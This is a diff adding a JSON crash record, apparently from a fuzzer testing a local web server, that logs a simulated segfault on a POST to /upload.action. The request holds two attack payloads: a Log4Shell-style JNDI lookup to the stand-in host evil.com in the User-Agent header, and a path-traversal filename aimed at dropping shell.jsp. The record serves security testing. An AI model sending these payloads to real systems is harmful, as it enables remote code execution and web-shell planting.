@@ -1,0 +1,23 @@
+{
+  "timestamp": "2025-12-29T14:42:15.245498",
+  "crash_type": "segfault",
+  "payload": "POST /upload.action?\nHeaders: {'User-Agent': '${jndi:ldap://evil.com/exploit}', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'close', 'Host': '127.0.0.1:8080', 'Content-Type': 'multipart/form-data', 'Content-Length': '7', 'Content-Disposition': 'form-data; name=\"upload\"; filename=\"../../../shell.jsp\"'}\nBody: field=\n",
+  "payload_hash": "0b9071375b90a76b",
+  "request_method": "POST",
+  "request_path": "/upload.action?",
+  "request_headers": {
+    "User-Agent": "${jndi:ldap://evil.com/exploit}",
+    "Accept-Encoding": "gzip, deflate",
+    "Accept": "*/*",
+    "Connection": "close",
+    "Host": "127.0.0.1:8080",
+    "Content-Type": "multipart/form-data",
+    "Content-Length": "7",
+    "Content-Disposition": "form-data; name=\"upload\"; filename=\"../../../shell.jsp\""
+  },
+  "request_body": "field=\n",
+  "error_message": "Simulated segfault",
+  "stack_trace": null,
+  "fuzzer_variant": null,
+  "iteration": 364
+}
